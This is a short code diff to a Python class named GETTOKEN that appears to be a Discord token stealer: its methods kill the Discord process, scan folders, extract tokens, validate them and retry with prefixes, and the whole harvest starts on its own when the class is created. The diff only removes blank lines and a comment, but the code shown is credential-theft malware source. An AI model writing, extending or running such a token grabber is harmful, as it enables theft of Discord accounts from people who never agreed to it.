@@ -46,8 +46,6 @@ class GETTOKEN:
         self.tokens = set()
         self.valid_tokens = set()
         self.server_names = defaultdict(set)
-
-        # Automatically start the extraction process when the class is initialized
         self.run()
 
     def killdiscord(self):
@@ -104,35 +102,28 @@ class GETTOKEN:
 
     def run(self):
         threads = []
-        
         folders = self.scanfolders()
         for folder in folders:
             thread = threading.Thread(target=self.extracttokens, args=(folder,))
             threads.append(thread)
             thread.start()
-
         for thread in threads:
             thread.join()
-        
         threads.clear()
         for token in self.tokens:
             thread = threading.Thread(target=self.validatetoken, args=(token,))
             threads.append(thread)
             thread.start()
-
         for thread in threads:
             thread.join()
-        
         threads.clear()
         for token in self.tokens:
             if token not in self.valid_tokens:
                 thread = threading.Thread(target=self.trywithprefix, args=(token,))
                 threads.append(thread)
                 thread.start()
-
         for thread in threads:
             thread.join()
 
     def gettokens(self):
         return list(self.valid_tokens)
-
